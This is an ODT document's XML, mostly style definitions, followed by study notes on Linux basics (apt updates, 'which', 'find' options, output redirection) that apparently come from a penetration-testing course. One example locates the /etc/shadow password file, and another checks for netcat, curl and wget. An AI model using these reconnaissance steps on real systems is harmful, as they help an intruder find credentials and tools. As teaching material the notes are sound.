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Consolas" svg:font-family="Consolas, Monaco, 'andale mono', 'ubuntu mono', monospac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style:style style:name="P1" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">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87eeb"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">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296cf8"/>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officeooo:paragraph-rsid="000a603a" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" officeooo:rsid="00127fd3" officeooo:paragraph-rsid="00127fd3" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" officeooo:rsid="001311df" officeooo:paragraph-rsid="001311df" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" officeooo:paragraph-rsid="0017daa5" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P9"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text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-style="italic" fo:font-weight="bold" officeooo:paragraph-rsid="001cb861" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-style="italic" fo:font-weight="bold" officeooo:paragraph-rsid="001c058e" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="001e35da" officeooo:paragraph-rsid="001e35da" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="00208640" officeooo:paragraph-rsid="00208640" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00127fd3" officeooo:paragraph-rsid="00127fd3" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="001311df" officeooo:paragraph-rsid="001311df" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="001d0ebb" officeooo:paragraph-rsid="001d0ebb" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:paragraph-rsid="001d0ebb" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:paragraph-rsid="001d0ebb" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:paragraph-rsid="00237eb2" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00327704" officeooo:paragraph-rsid="00327704" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:paragraph-rsid="001c058e"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paragraph-rsid="001cb861" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:paragraph-rsid="001c058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2020c5" officeooo:paragraph-rsid="002020c5"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weight="normal" officeooo:rsid="00208640" officeooo:paragraph-rsid="00208640"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fo:font-size="10pt" fo:font-weight="normal" officeooo:paragraph-rsid="00237eb2" style:font-size-asian="8.75pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:paragraph-rsid="00327704" style:font-size-asian="8.75pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="00327704" officeooo:paragraph-rsid="00327704" style:font-size-asian="8.75pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold"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6pt" fo:font-weight="bold" officeooo:paragraph-rsid="0017c712"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fo:font-weight="bold" officeooo:paragraph-rsid="00193f40"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16pt" fo:font-weight="bold" officeooo:paragraph-rsid="001c058e"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font-weight="bold" officeooo:paragraph-rsid="001d0ebb"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font-weight="bold" officeooo:paragraph-rsid="00237eb2" style:font-size-asian="16pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="16pt" fo:font-weight="bold" officeooo:paragraph-rsid="002db8ac"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size="16pt" fo:font-weight="bold" officeooo:paragraph-rsid="001c058e"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16pt" fo:font-weight="normal" officeooo:paragraph-rsid="00237eb2" style:font-size-asian="16pt" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-size="10pt" fo:font-weight="normal" officeooo:paragraph-rsid="001d0ebb"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fo:color="#000000" loext:opacity="100%" fo:font-size="10pt" fo:font-weight="normal" officeooo:paragraph-rsid="00237eb2"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fo:font-size="10pt" fo:font-weight="normal" officeooo:paragraph-rsid="002db8ac" style:font-size-asian="8.75pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-size="10pt" fo:font-weight="normal" officeooo:paragraph-rsid="00237eb2" style:font-size-asian="8.75pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-size="10pt" fo:font-style="italic" fo:font-weight="bold" officeooo:paragraph-rsid="001d0ebb" style:font-size-asian="8.75pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-size="10pt" fo:font-style="italic" fo:font-weight="bold" officeooo:paragraph-rsid="00237eb2" style:font-size-asian="8.75pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#395511" loext:opacity="100%" fo:font-size="16pt" fo:font-weight="bold" officeooo:paragraph-rsid="001d0ebb" style:font-size-asian="16pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#395511" loext:opacity="100%" fo:font-size="16pt" fo:font-weight="bold" officeooo:paragraph-rsid="001c058e" style:font-size-asian="16pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#395511" loext:opacity="100%" fo:font-size="16pt" fo:font-weight="bold" style:font-size-asian="16pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#395511" loext:opacity="100%" fo:font-size="16pt" fo:font-weight="bold" officeooo:paragraph-rsid="00237eb2" style:font-size-asian="16pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#395511" loext:opacity="100%" fo:font-size="16pt" fo:font-weight="bold" officeooo:paragraph-rsid="002db8ac" style:font-size-asian="16pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:color="#395511" loext:opacity="100%" officeooo:paragraph-rsid="00193f40"/>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text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0039eef5" officeooo:paragraph-rsid="0039eef5" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-style="italic" fo:font-weight="bold" officeooo:rsid="0038978e" officeooo:paragraph-rsid="0039decc" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0038978e" officeooo:paragraph-rsid="003d8076" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-style="italic" fo:font-weight="normal" officeooo:rsid="0038978e" officeooo:paragraph-rsid="003d8076" style:font-size-asian="10pt" style:font-style-asian="italic" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-style-complex="italic" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="0032e0af" officeooo:paragraph-rsid="0032e0af" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="003380db" officeooo:paragraph-rsid="003380db" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="003714f6" officeooo:paragraph-rsid="003714f6" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="0038978e" officeooo:paragraph-rsid="0038978e"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fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="0038978e" officeooo:paragraph-rsid="0039decc"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font-size="10pt" fo:font-weight="normal" officeooo:rsid="0038978e" officeooo:paragraph-rsid="003be65f" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="0038978e" officeooo:paragraph-rsid="003d8076"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fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="0039eef5" officeooo:paragraph-rsid="0039eef5" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="003f9aea" officeooo:paragraph-rsid="003f9aea" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="003f9aea" officeooo:paragraph-rsid="00412e09" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="0042dfda" officeooo:paragraph-rsid="0042dfda" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="004424f9" officeooo:paragraph-rsid="004424f9" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="00498e79" officeooo:paragraph-rsid="00498e79" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0032e0af" officeooo:paragraph-rsid="0032e0af" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="003380db" officeooo:paragraph-rsid="003380db" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="003714f6" officeooo:paragraph-rsid="003714f6" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0038978e" officeooo:paragraph-rsid="0038978e" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P75" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="003f9aea" officeooo:paragraph-rsid="003f9aea" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P76" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0042dfda" officeooo:paragraph-rsid="0042dfda" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P77" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="004424f9" officeooo:paragraph-rsid="004424f9" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties officeooo:paragraph-rsid="0038978e"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Sans" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Sans" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00292000" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Sans" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" officeooo:rsid="00296cf8" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Sans" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" officeooo:rsid="00087eeb"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weight="bold" officeooo:rsid="0039decc" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0038978e" style:font-size-asian="10pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-size="10pt" fo:font-weight="normal" officeooo:rsid="0038978e" style:font-size-asian="10pt" style:font-weight-asian="normal" style:font-size-complex="10pt"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f3116"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties officeooo:rsid="0017c712"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties officeooo:rsid="00193f40"/>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bold" officeooo:rsid="0017c712" style:font-size-asian="16pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-size="16pt" fo:font-weight="bold" officeooo:rsid="00193f40" style:font-size-asian="16pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties officeooo:rsid="001c058e"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties officeooo:rsid="001cb861"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties officeooo:rsid="0022a29a"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties officeooo:rsid="00255f23"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties officeooo:rsid="002db8ac"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-style="italic" fo:font-weight="bold" style:font-size-asian="12pt" style:font-style-asian="italic" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-style-complex="italic" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003d8076" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties officeooo:rsid="00318a58"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties officeooo:rsid="0039decc"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties officeooo:rsid="003d8076"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties officeooo:rsid="00412e09"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties officeooo:rsid="004162e4"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties officeooo:rsid="004806ee"/>
    </style:style>
    <style:style style:name="T29" style:family="text">
      <style:text-properties officeooo:rsid="004c56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4">Update:</text:span></text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">sudo apt update -y &amp;&amp; sudo apt full-upgrade -y &amp;&amp; apt dist-upgrade </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3">&amp;&amp; </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T1">sudo apt autoremove -y &amp;&amp; sudo apt autoclean -y <text:s/></text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">&amp;&amp; sudo apt update </text:span></text:span></text:p>
      <text:p text:style-name="P48"><text:s/>&lt;&lt;&lt; File Descriptors and Redirections &gt;&gt;&gt;</text:p>
      <text:p text:style-name="P3">Which</text:p>
      <text:p text:style-name="Standard">One of the common tools is which. This tool returns the path to the file or link that should be executed. This allows us to determine if specific programs, like cURL, netcat, wget, python, gcc, are available on the operating system. Let us use it to search for Python in our interactive instance.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P3">Find</text:p>
      <text:p text:style-name="Standard">Another handy tool is find. Besides the function to find files and folders, this tool also contains the function to filter the results. We can use filter parameters like the size of the file or the date. We can also specify if we only search for files or folders.</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P39">find &lt;location&gt; &lt;options&gt;</text:p>
      <text:p text:style-name="P39">find / -type f -name *.conf -user root -size +20k -newermt 2020-03-03 -exec ls -al {} \; 2&gt;/dev/null</text:p>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P39">Option<text:tab/>Description</text:p>
      <text:p text:style-name="P4">-type f<text:tab/>Hereby, we define the type of the searched object. In this case, 'f' stands for 'file'.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">-name *.conf<text:tab/>With '-name', we indicate the name of the file we are looking for. The asterisk (*) stands for 'all' files with the '.conf' extension.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">-user root<text:tab/>This option filters all files whose owner is the root user.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">-size +20k<text:tab/>We can then filter all the located files and specify that we only want to see the files that are larger than 20 KiB.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">-newermt 2020-03-03<text:tab/>With this option, we set the date. Only files newer than the specified date will be presented.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5">-exec ls -al {} \;<text:tab/>This option executes the specified command, using the curly brackets as placeholders for each result.</text:p>
      <text:p text:style-name="P5">The backslash escapes the next character from being interpreted by the shell because otherwise, the semicolon would terminate the command and not reach the redirection.</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P4">2&gt;/dev/null<text:tab/>This is a STDERR redirection to the 'null device', which we will come back to in the next section. This redirection ensures that no errors are displayed in the terminal. This redirection must not be an option of the 'find' command</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P4">find /etc/ -name shadow 2&gt;/dev/null</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P9">Redirect STDOUT to a File</text:p>
      <text:p text:style-name="P4">Now we can see that all errors (STDERR) previously presented with "Permission denied" are no longer displayed. The only result we see now is the standard output (STDOUT), which we can also redirect to a file with the name results.txt that will only contain standard output without the standard errors.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P9">Redirect STDOUT to a File</text:p>
      <text:p text:style-name="P4">$ find /etc/ -name shadow 2&gt;/dev/null &gt; results.txt</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P9">Redirect STDOUT and STDERR to Separate Files</text:p>
      <text:p text:style-name="P4">We should have noticed that we did not use a number before the greater-than sign (&gt;) in the last example. That is because we redirected all the standard errors to the "null device" before, and the only output we get is the standard output (FD 1 - STDOUT). To make this more precise, we will redirect standard error (FD 2 - STDERR) and standard output (FD 1 - STDOUT) to different files.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P9">Redirect STDOUT and STDERR to Separate Files</text:p>
